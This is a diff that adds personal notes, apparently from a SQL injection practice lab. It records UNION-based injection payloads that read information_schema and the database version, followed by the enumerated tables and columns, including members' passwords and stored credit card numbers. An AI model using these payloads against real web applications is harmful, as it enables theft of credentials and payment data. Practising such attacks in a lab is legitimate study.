@@ -92,3 +92,107 @@ cammies -- service charlies
 
 
 
+
+
+
+RAM ' UNION SELECT table_schema, column_name from information_schema.columns#
+sqlinjection	id
+sqlinjection	name
+sqlinjection	description
+sqlinjection	username
+sqlinjection	password
+sqlinjection	first_name
+sqlinjection	last_name
+sqlinjection	email
+sqlinjection	permission
+sqlinjection	quantity
+sqlinjection	product
+sqlinjection	order
+sqlinjection	date
+sqlinjection	member
+sqlinjection	creditcard_number
+sqlinjection	level
+sqlinjection	price
+sqlinjection	qty_left
+sqlinjection	category
+sqlinjection	comment
+sqlinjection	mime
+sqlinjection	data
+
+
+RAM ' UNION SELECT table_schema, @@version from information_schema.columns#
+to find version
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+sqlinjection	categories	id
+sqlinjection	categories	name
+sqlinjection	categories	description
+
+sqlinjection	members	id
+sqlinjection	members	username
+sqlinjection	members	password
+sqlinjection	members	first_name
+sqlinjection	members	last_name
+sqlinjection	members	email
+sqlinjection	members	permission
+
+sqlinjection	orderlines	id
+sqlinjection	orderlines	quantity
+sqlinjection	orderlines	product
+sqlinjection	orderlines	order
+
+sqlinjection	orders	id
+sqlinjection	orders	date
+sqlinjection	orders	member
+
+sqlinjection	payments	id
+sqlinjection	payments	creditcard_number
+sqlinjection	payments	date
+sqlinjection	payments	order
+
+sqlinjection	permissions	id
+sqlinjection	permissions	level
+sqlinjection	permissions	name
+sqlinjection	permissions	description
+
+sqlinjection	products	id
+sqlinjection	products	name
+sqlinjection	products	description
+sqlinjection	products	price
+sqlinjection	products	qty_left
+sqlinjection	products	category
+
+sqlinjection	share4	id
+sqlinjection	share4	comment
+sqlinjection	share4	mime
+sqlinjection	share4	data
+
+
+
+
+
+
+
+
+
+
